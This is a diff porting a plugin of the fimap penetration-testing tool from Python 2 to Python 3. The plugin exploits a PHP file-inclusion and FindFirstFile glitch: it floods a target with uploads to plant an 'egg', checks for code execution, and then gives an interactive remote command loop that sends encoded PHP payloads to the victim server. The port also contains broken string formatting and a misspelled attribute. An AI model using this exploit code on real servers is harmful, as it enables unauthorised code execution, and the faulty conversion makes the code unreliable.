@@ -3,7 +3,7 @@ from plugininterface import basePlugin
 # Plugin by Iman Karim <fimap.dev@gmail.com>
 # License: GPLv2
 
-import urlparse, socket, threading, base64, urllib, string, random, time
+import urllib.parse, socket, threading, base64, urllib.request, urllib.parse, urllib.error, string, random, time
 
 
 
@@ -32,7 +32,7 @@ class FindFirstFileAbuse(basePlugin):
         #self.HTTP_DATA += "Cookie: \r\n" 
         self.HTTP_DATA += "HTTP_USER_AGENT: Firefox\r\n" #TODO: Implement real user agent.
         self.HTTP_DATA += "Content-Type: multipart/form-data; boundary=---------------------------58239048594367238956\r\n"
-        self.HTTP_DATA += "Content-Length: %s\r\n".format(str(len(self.FILE_DATA))
+        self.HTTP_DATA += "Content-Length: %s\r\n".format(str(len(self.FILE_DATA)))
         self.HTTP_DATA += "\r\n"
         self.HTTP_DATA += self.FILE_DATA
         
@@ -81,49 +81,49 @@ class FindFirstFileAbuse(basePlugin):
                 options.append("q. Back to fimap")
                 
                 haxhelper.drawBox("FindFirstFile Glitch", options)
-                inp = raw_input("Choose action: ")
+                inp = input("Choose action: ")
                 
                 try:
                     idx = int(inp)
                     
                     if (idx == 1):
-                        self.remotetmpdir = raw_input("Please type in the complete URL of the Remote Temporary Directory: ")
-                        print("Remote Temporary Directory URL changed to: %s".format(self.remotetmpdir))
+                        self.remotetmpdir = input("Please type in the complete URL of the Remote Temporary Directory: ")
+                        print(("Remote Temporary Directory URL changed to: %s".format(self.remotetmpdir)))
                     
                     elif (idx == 2):
                         print("AutoProbe not implemented right now :(")
                         
                     elif (idx == 3):
-                        tmp = raw_input("Please type in the number of attempts you wish: ")
+                        tmp = input("Please type in the number of attempts you wish: ")
                         try:
                             n = int(tmp)
                             if (n <= 0):
                                 print("WTH. Zero or less attempts are not smart bro.")
                             else:
                                 self.maxAttempts = n
-                                print("MaxAttempts changed to: %s".format(self.maxAttemps))
+                                print(("MaxAttempts changed to: %s".format(self.maxAttemps)))
                         except:
                             print("Invalid number.")
                         
                     elif (idx == 4):
-                        tmp = raw_input("Please type in the number of threads you wish: ")
+                        tmp = input("Please type in the number of threads you wish: ")
                         try:
                             n = int(tmp)
                             if (n <= 0):
                                 print("WTH. Zero or less threads are not smart bro.")
                             else:
                                 self.maxThreads = n
-                                print("MaxThreads changed to: %s".format(self.maxThreads))
+                                print(("MaxThreads changed to: %s".format(self.maxThreads)))
                         except:
                             print("Invalid number.")
                         
                     elif (idx == 5):
-                        self.egg = raw_input("Please type location where to try to drop the egg.\nPlease no trailing '\\' :")
-                        print("EggDrop location changed to: %s".format(self.egg))
+                        self.egg = input("Please type location where to try to drop the egg.\nPlease no trailing '\\' :")
+                        print(("EggDrop location changed to: %s".format(self.egg)))
                     
                     elif (idx == 6):
-                        self.lotteryTicket = raw_input("Please type in your new lottery ticket: ")
-                        print("LotteryTicket changed to: %s".format(self.lotteryTicket))
+                        self.lotteryTicket = input("Please type in your new lottery ticket: ")
+                        print(("LotteryTicket changed to: %s".format(self.lotteryTicket)))
                     
                                         
                     elif(idx == 0):
@@ -158,15 +158,15 @@ class FindFirstFileAbuse(basePlugin):
                                 
                                 path, postdata, header, trash = haxhelper.getHaxDataForCustomFile(self.egg)
                                 
-                                domain = urlparse.urlsplit(haxhelper.getURL())[1]
-                                url = urlparse.urljoin("http://" + domain, path)
+                                domain = urllib.parse.urlsplit(haxhelper.getURL())[1]
+                                url = urllib.parse.urljoin("http://" + domain, path)
                                 
                                 post = ""
                                 
                                 if (postdata != ""):
                                     post = postdata + "&"
                                 
-                                post += urllib.urlencode({"data": base64.b64encode(quiz)})
+                                post += urllib.parse.urlencode({"data": base64.b64encode(quiz)})
                                 res = haxhelper.doRequest(url, post, header)
                                 
                                 if (res.find(answer) != -1):
@@ -183,7 +183,7 @@ class FindFirstFileAbuse(basePlugin):
                                             code = item.generatePayload(shell_test_code)
                                             code = code.replace("<?php", "")
                                             code = code.replace("?>", "")
-                                            testload = urllib.urlencode({"data": base64.b64encode(code)})
+                                            testload = urllib.parse.urlencode({"data": base64.b64encode(code)})
                                             
                                             if (postdata != ""):
                                                 testload = "%s&%s".format(postdata, testload)
@@ -200,18 +200,18 @@ class FindFirstFileAbuse(basePlugin):
                                                 print("Upload your own shell to be on the safe side.")
                                                 print("--------------------------------------------------------------------")
                                                 
-                                                payload = raw_input(shell_banner)
+                                                payload = input(shell_banner)
                                                 
                                                 while (payload != "q" and payload != "Q"):
                                                     payload = item.generatePayload(payload)
                                                     payload = payload.replace("<?php", "")
                                                     payload = payload.replace("?>", "")
-                                                    payload = urllib.urlencode({"data": base64.b64encode(payload)})
+                                                    payload = urllib.parse.urlencode({"data": base64.b64encode(payload)})
                                                     if (postdata != ""):
                                                         payload = "%s&%s".format(postdata, payload)
                                                     code = self.doPostRequest(url, payload, header)
                                                     print(code)
-                                                    payload = raw_input(shell_banner)
+                                                    payload = input(shell_banner)
                                                 
                                                 return
                                         else:
@@ -227,7 +227,7 @@ class FindFirstFileAbuse(basePlugin):
                     pass
             
     def createEgg(self, haxhelper, path, postdata):
-        host = urlparse.urlsplit(haxhelper.getURL())[1]
+        host = urllib.parse.urlsplit(haxhelper.getURL())[1]
         
         runningThreads = []
         
@@ -249,7 +249,7 @@ class FindFirstFileAbuse(basePlugin):
                 newThread = ProbeThread(host, 80, content, haxhelper, self.display)
                 runningThreads.append(newThread)
                 newThread.start()
-                print("Thread Attempt %d started...".format(attempt)
+                print(("Thread Attempt %d started...".format(attempt)))
                 attempt+=1
 
             for probe in runningThreads:
@@ -262,7 +262,7 @@ class FindFirstFileAbuse(basePlugin):
                 break
             
         if (success):
-            print("Egg dropped successfully!"
+            print("Egg dropped successfully!")
         
         print("Waiting for remaining threads to finish...")
         print("Hit CTRL+C to just kill the threads like an arse.")
